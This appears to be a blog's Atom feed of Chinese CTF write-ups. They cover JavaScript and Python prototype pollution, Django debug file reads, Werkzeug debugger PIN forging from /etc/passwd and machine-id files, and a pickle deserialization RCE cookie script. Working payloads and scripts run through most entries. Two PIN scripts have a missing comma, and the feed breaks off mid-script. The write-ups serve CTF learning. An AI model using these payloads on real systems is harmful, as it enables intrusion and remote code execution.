<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>MyBlog</title>
  
  <subtitle>MyBlog</subtitle>
  <link href="http://1768161086.github,io/atom.xml" rel="self"/>
  
  <link href="http://1768161086.github,io/"/>
  <updated>2025-03-31T10:13:57.005Z</updated>
  <id>http://1768161086.github,io/</id>
  
  <author>
    <name>userq</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>javascript原型链污染</title>
    <link href="http://1768161086.github,io/2025/03/31/javascript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <id>http://1768161086.github,io/2025/03/31/javascript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</id>
    <published>2025-03-31T10:09:27.000Z</published>
    <updated>2025-03-31T10:13:57.005Z</updated>
    
    <content type="html"><![CDATA[<h2 id="攻防世界-wife-wife"><a href="#攻防世界-wife-wife" class="headerlink" title="攻防世界_wife_wife"></a>攻防世界_wife_wife</h2><p>1.由于使用了assign()，因此存在Javascript原型链污染的漏洞。</p><p>2.进入就是一个登陆界面，尝试sql注入，用御剑扫描，都没有新发现。</p><p>3.注册页面，有一个<code>is admin</code>选项，想要得到正确的flag必须注册admin的账号</p><p>4.当勾选<code>is admin</code>时，必须填入邀请码，否则无法注册</p><p>5.Javascript原型链污染,利用该漏洞的前提是后端使用<strong>Node.js</strong>语言,使用wappalyzer</p><p>6.在注册时输入错误的邀请码，返回如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;1&quot;,&quot;password&quot;:&quot;2&quot;,&quot;isAdmin&quot;:true,&quot;inviteCode&quot;:&quot;123&quot;&#125;</span><br><span class="line">返回：invalid</span><br></pre></td></tr></table></figure><p>7.在请求报文中，可以看到有isAdmin参数，使用Javascript原型链污染，更改请求报文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;1&quot;,&quot;password&quot;:&quot;2&quot;,</span><br><span class="line">&quot;__proto__&quot;:&#123;</span><br><span class="line">&quot;isAdmin&quot;:true&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>8.管理员用户创建成功，使用该用户登录即可拿到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;攻防世界-wife-wife&quot;&gt;&lt;a href=&quot;#攻防世界-wife-wife&quot; class=&quot;headerlink&quot; title=&quot;攻防世界_wife_wife&quot;&gt;&lt;/a&gt;攻防世界_wife_wife&lt;/h2&gt;&lt;p&gt;1.由于使用了assign()，因此存在Ja</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>python_django</title>
    <link href="http://1768161086.github,io/2025/03/30/python-django/"/>
    <id>http://1768161086.github,io/2025/03/30/python-django/</id>
    <published>2025-03-30T06:25:39.000Z</published>
    <updated>2025-03-30T06:45:09.184Z</updated>
    
    <content type="html"><![CDATA[<h2 id="攻防世界-Cat"><a href="#攻防世界-Cat" class="headerlink" title="攻防世界-Cat"></a>攻防世界-Cat</h2><p>打开发现url输入框</p><p>1.sqlfuzz测试</p><p>2.爆破发现%df和%a0长度较大</p><p>3.查看发现了Django</p><p>4. 既然是django文件还有前端代码，复制后用游览器打开试试</p><p>5.用游览器打开以后最底下可以看到一串提示：You’re seeing this error because you have DEBUG &#x3D; True in your Django settings file. Change that to False, and Django will display a standard page generated by the handler for this status code.</p><p>6.直接所有settings，会发现很多，但是比较特殊的有这个（和settings和database有关，百度搜索）</p><p>7.对应的路径：&#x2F;opt&#x2F;api&#x2F;database.sqlite3</p><p>8.最终的payload：@&#x2F;opt&#x2F;api&#x2F;database.sqlite3</p><p>9.搜索关键字ctf发现flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;攻防世界-Cat&quot;&gt;&lt;a href=&quot;#攻防世界-Cat&quot; class=&quot;headerlink&quot; title=&quot;攻防世界-Cat&quot;&gt;&lt;/a&gt;攻防世界-Cat&lt;/h2&gt;&lt;p&gt;打开发现url输入框&lt;/p&gt;
&lt;p&gt;1.sqlfuzz测试&lt;/p&gt;
&lt;p&gt;2.爆破发现%df</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>flask_pin</title>
    <link href="http://1768161086.github,io/2025/03/29/flask-pin/"/>
    <id>http://1768161086.github,io/2025/03/29/flask-pin/</id>
    <published>2025-03-29T03:01:51.000Z</published>
    <updated>2025-03-29T03:23:29.553Z</updated>
    
    <content type="html"><![CDATA[<h1 id="flask-pin"><a href="#flask-pin" class="headerlink" title="flask_pin"></a>flask_pin</h1><h2 id="1-什么是pin码"><a href="#1-什么是pin码" class="headerlink" title="1.什么是pin码"></a><strong>1.什么是pin码</strong></h2><p>pin码也就是flask在开启debug模式下，进行代码调试模式的进入密码，需要正确的PIN码才能进入调试模式。</p><h2 id="2-PIN生成要素"><a href="#2-PIN生成要素" class="headerlink" title="2.PIN生成要素"></a>2.<strong>PIN生成要素</strong></h2><ul><li>username，用户名</li><li>modname，默认值为flask.app</li><li>appname，默认值为Flask</li><li>moddir，flask库下app.py的绝对路径</li><li>uuidnode，当前网络的mac地址的十进制数</li><li>machine_id，docker机器id</li></ul><p><strong>username</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过getpass.getuser()读取，通过文件读取/etc/passwd</span><br></pre></td></tr></table></figure><p><strong>modname</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过getattr(mod,“file”,None)读取，默认值为flask.app</span><br></pre></td></tr></table></figure><p><strong>appname</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过getattr(app,“name”,type(app).name)读取，默认值为Flask</span><br></pre></td></tr></table></figure><p><strong>moddir</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当前网络的mac地址的十进制数，通过getattr(mod,“file”,None)读取实际应用中通过报错读取</span><br></pre></td></tr></table></figure><p><strong>uuidnode</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过uuid.getnode()读取，通过文件/sys/class/net/eth0/address得到16进制结果，转化为10进制进行计算</span><br></pre></td></tr></table></figure><p><strong>machine_id</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">每一个机器都会有自已唯一的id，linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_id，docker靶机则读取/proc/self/cgroup，其中第一行的/docker/字符串后面的内容作为机器的id，在非docker环境下读取后两个，非docker环境三个都需要读取</span><br><span class="line">/etc/machine-id</span><br><span class="line">/proc/sys/kernel/random/boot_id</span><br><span class="line">/proc/self/cgroup</span><br></pre></td></tr></table></figure><h2 id="3-上面的pin元素能干嘛呢"><a href="#3-上面的pin元素能干嘛呢" class="headerlink" title="3.上面的pin元素能干嘛呢"></a>3.<strong>上面的pin元素能干嘛呢</strong></h2><p>生成pin码的脚本如下：</p><p>pytho3.5版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">from itertools import chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    &#x27;root&#x27;,# username</span><br><span class="line">    &#x27;flask.app&#x27;,# modname</span><br><span class="line">    &#x27;Flask&#x27;,# getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span><br><span class="line">    &#x27;/usr/local/lib/python3.5/site-packages/flask/app.py&#x27; # getattr(mod, &#x27;__file__&#x27;, None),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    &#x27;2485377892354&#x27;,# str(uuid.getnode()),  /sys/class/net/ens33/address</span><br><span class="line">    &#x27;32e48d371198e8420c53b0a1fa37e94d&#x27;# get_machine_id(), /etc/machine-id+/proc/self/cgroup</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line">for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">    if not bit:</span><br><span class="line">        continue</span><br><span class="line">    if isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(&#x27;utf-8&#x27;)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(b&#x27;cookiesalt&#x27;)</span><br><span class="line"></span><br><span class="line">cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]</span><br><span class="line"></span><br><span class="line">num = None</span><br><span class="line">if num is None:</span><br><span class="line">    h.update(b&#x27;pinsalt&#x27;)</span><br><span class="line">    num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]</span><br><span class="line"></span><br><span class="line">rv =None</span><br><span class="line">if rv is None:</span><br><span class="line">    for group_size in 5, 4, 3:</span><br><span class="line">        if len(num) % group_size == 0:</span><br><span class="line">            rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;)</span><br><span class="line">                          for x in range(0, len(num), group_size))</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>官方是通过系统命令获取相对应的值，我们采用读文件获取值后放到脚本(也就是官方加密的方法)里进行加密，3.6采用MD5加密，3.8采用sha1加密，所以脚本稍有不同</p><p>python3.6</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#MD5</span><br><span class="line">import hashlib</span><br><span class="line">from itertools import chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">     &#x27;flaskweb&#x27;# username</span><br><span class="line">     &#x27;flask.app&#x27;,# modname</span><br><span class="line">     &#x27;Flask&#x27;,# getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span><br><span class="line">     &#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27; # getattr(mod, &#x27;__file__&#x27;, None),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">     &#x27;25214234362297&#x27;,# str(uuid.getnode()),  /sys/class/net/ens33/address</span><br><span class="line">     &#x27;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#x27;# get_machine_id(), /etc/machine-id</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line">for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">    if not bit:</span><br><span class="line">        continue</span><br><span class="line">    if isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(&#x27;utf-8&#x27;)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(b&#x27;cookiesalt&#x27;)</span><br><span class="line"></span><br><span class="line">cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]</span><br><span class="line"></span><br><span class="line">num = None</span><br><span class="line">if num is None:</span><br><span class="line">   h.update(b&#x27;pinsalt&#x27;)</span><br><span class="line">   num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]</span><br><span class="line"></span><br><span class="line">rv =None</span><br><span class="line">if rv is None:</span><br><span class="line">   for group_size in 5, 4, 3:</span><br><span class="line">       if len(num) % group_size == 0:</span><br><span class="line">          rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;)</span><br><span class="line">                      for x in range(0, len(num), group_size))</span><br><span class="line">          break</span><br><span class="line">       else:</span><br><span class="line">          rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>python3.8</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">#sha1</span><br><span class="line">import hashlib</span><br><span class="line">from itertools import chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    &#x27;root&#x27;# /etc/passwd</span><br><span class="line">    &#x27;flask.app&#x27;,# 默认值</span><br><span class="line">    &#x27;Flask&#x27;,# 默认值</span><br><span class="line">    &#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27; # 报错得到</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    &#x27;2485377581187&#x27;,#  /sys/class/net/eth0/address 16进制转10进制</span><br><span class="line">    #machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span><br><span class="line">    &#x27;653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd&#x27;#  /proc/self/cgroup</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line">for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">    if not bit:</span><br><span class="line">        continue</span><br><span class="line">    if isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(&#x27;utf-8&#x27;)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(b&#x27;cookiesalt&#x27;)</span><br><span class="line"></span><br><span class="line">cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]</span><br><span class="line"></span><br><span class="line">num = None</span><br><span class="line">if num is None:</span><br><span class="line">    h.update(b&#x27;pinsalt&#x27;)</span><br><span class="line">    num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]</span><br><span class="line"></span><br><span class="line">rv =None</span><br><span class="line">if rv is None:</span><br><span class="line">    for group_size in 5, 4, 3:</span><br><span class="line">        if len(num) % group_size == 0:</span><br><span class="line">            rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;)</span><br><span class="line">                          for x in range(0, len(num), group_size))</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据上述的信息，我们要先获得正确的pin码，那就一个个来吧</p><p>1.<strong>确定python版本</strong></p><p>python版本为3.5</p><p>2.<strong>确定flask的存储位置</strong></p><p>根据实例报错可知路径为&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.5&#x2F;site-packages&#x2F;flask&#x2F;app.py</p><p>3.<strong>获取username</strong></p><p>根据源代码可知，root下面有个file路径可以访问其他文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入：/file?filename=/etc/passwd</span><br></pre></td></tr></table></figure><p>username为root</p><p>4.<strong>获取uuidnode</strong></p><p>&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</p><p>得到uuidnode的十六进制为：02:42:ac:02:1f:fc</p><p>我们需要将其转化为10进制：2485376917500</p><p>5.<strong>获取machine_id</strong></p><p>访问&#x2F;etc&#x2F;machine-id</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c31eea55a29431535ff01de94bdcf5cf</span><br></pre></td></tr></table></figure><p>访问&#x2F;proc&#x2F;self&#x2F;cgroup</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">27f9f599813e5072c65483b50b8e6174b44d216d88028c399feb87c8c4eed31e</span><br></pre></td></tr></table></figure><p>6.<strong>运行脚本获取pin码</strong></p><p>7.进入console路由</p><p>输入pin码后进入调试模式</p><p>8.控制台导入os模块，运行语句，获取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.popen(&#x27;ls&#x27;).read()</span><br><span class="line">os.popen(&#x27;ls /&#x27;).read()</span><br><span class="line">os.popen(&#x27;cat /flaggggg&#x27;).read()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;flask-pin&quot;&gt;&lt;a href=&quot;#flask-pin&quot; class=&quot;headerlink&quot; title=&quot;flask_pin&quot;&gt;&lt;/a&gt;flask_pin&lt;/h1&gt;&lt;h2 id=&quot;1-什么是pin码&quot;&gt;&lt;a href=&quot;#1-什么是pin码&quot; class</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>pickle反序列化</title>
    <link href="http://1768161086.github,io/2025/03/29/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://1768161086.github,io/2025/03/29/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2025-03-29T02:53:34.000Z</published>
    <updated>2025-03-29T02:57:10.405Z</updated>
    
    <content type="html"><![CDATA[<h2 id="polar-unpickle"><a href="#polar-unpickle" class="headerlink" title="polar_unpickle"></a>polar_unpickle</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">from flask import Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/&quot;)</span><br><span class="line">def index():</span><br><span class="line">    try:</span><br><span class="line">        user = base64.b64decode(request.cookies.get(&#x27;user&#x27;))</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        return user</span><br><span class="line">    except:</span><br><span class="line">        username = &quot;Guest&quot;</span><br><span class="line"></span><br><span class="line">    return &quot;Hello %s&quot; % username</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(host=&quot;0.0.0.0&quot;, port=8080)</span><br></pre></td></tr></table></figure><p>1.根据上述的分析，pickle反序列化使用cookies传入</p><p>2.可以编写一段先base64编码再序列化的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">import requests</span><br><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class exp(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (eval,(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;,))//利用os.popen查询</span><br><span class="line">#这里的语句也可以换成return (eval, (&quot;open(&#x27;/flag&#x27;).read()&quot;,))，也可以利用反弹语句获取shell，但这个实例好像不能使用反弹获取shell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = exp()</span><br><span class="line">s = pickle.dumps(e)//将获取的对象序列化</span><br><span class="line">user = base64.b64encode(s).decode()//将序列化的对象使用base64加密</span><br><span class="line">print(user)//输出加密后的序列化对象</span><br><span class="line"></span><br><span class="line">response = requests.get(&quot;URL&quot;, cookies=dict(</span><br><span class="line">    user=base64.b64encode(s).decode()</span><br><span class="line">))</span><br><span class="line">print(response.content)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;polar-unpickle&quot;&gt;&lt;a href=&quot;#polar-unpickle&quot; class=&quot;headerlink&quot; title=&quot;polar_unpickle&quot;&gt;&lt;/a&gt;polar_unpickle&lt;/h2&gt;&lt;figure class=&quot;highlight </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>python原型链污染</title>
    <link href="http://1768161086.github,io/2025/03/19/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <id>http://1768161086.github,io/2025/03/19/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</id>
    <published>2025-03-19T07:55:31.000Z</published>
    <updated>2025-03-19T08:38:49.129Z</updated>
    
    <content type="html"><![CDATA[<h2 id="圣钥之战1-0"><a href="#圣钥之战1-0" class="headerlink" title="圣钥之战1.0"></a>圣钥之战1.0</h2><p>访问read路由拿到源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">J1ngHong说：你想read flag吗？</span><br><span class="line">那么圣钥之光必将阻止你！</span><br><span class="line">但是小小的源码没事，因为你也读不到flag(乐)</span><br><span class="line"></span><br><span class="line">from flask import Flask,request</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">def merge(src, dst):</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line">def is_json(data):</span><br><span class="line">    try:</span><br><span class="line">        json.loads(data)</span><br><span class="line">        return True</span><br><span class="line">    except ValueError:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">class cls():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def hello_world():</span><br><span class="line">    return open(&#x27;/static/index.html&#x27;, encoding=&quot;utf-8&quot;).read()</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/read&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def Read():</span><br><span class="line">    file = open(__file__, encoding=&quot;utf-8&quot;).read()</span><br><span class="line">    return f&quot;J1ngHong说：你想read flag吗？</span><br><span class="line">那么圣钥之光必将阻止你！</span><br><span class="line">但是小小的源码没事，因为你也读不到flag(乐)</span><br><span class="line"></span><br><span class="line">&#123;file&#125;</span><br><span class="line"></span><br><span class="line">&quot;</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/pollute&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def Pollution():</span><br><span class="line">    if request.is_json:</span><br><span class="line">        merge(json.loads(request.data),instance)</span><br><span class="line">    else:</span><br><span class="line">        return &quot;J1ngHong说：钥匙圣洁无暇，无人可以污染！&quot;</span><br><span class="line">    return &quot;J1ngHong说：圣钥暗淡了一点，你居然污染成功了？&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=80)</span><br></pre></td></tr></table></figure><p>python原型链污染</p><p>把file改成&#x2F;flag然后访问read路由即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line"># 目标URL</span><br><span class="line">url = &quot;http://gz.imxbt.cn:20603/read&quot;</span><br><span class="line"></span><br><span class="line"># 构造包含特殊键的 JSON 数据</span><br><span class="line">payload = &#123;</span><br><span class="line">    &quot;__class__&quot;:&#123;</span><br><span class="line">        &quot;__init__&quot;:&#123;</span><br><span class="line">            &quot;__globals__&quot;:&#123;</span><br><span class="line">                &quot;BLACKLIST_IN_index&quot; : [] //或者&quot;__file__&quot;:&quot;/flag&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 将 JSON 数据转换为字符串</span><br><span class="line">payload_json = json.dumps(payload)</span><br><span 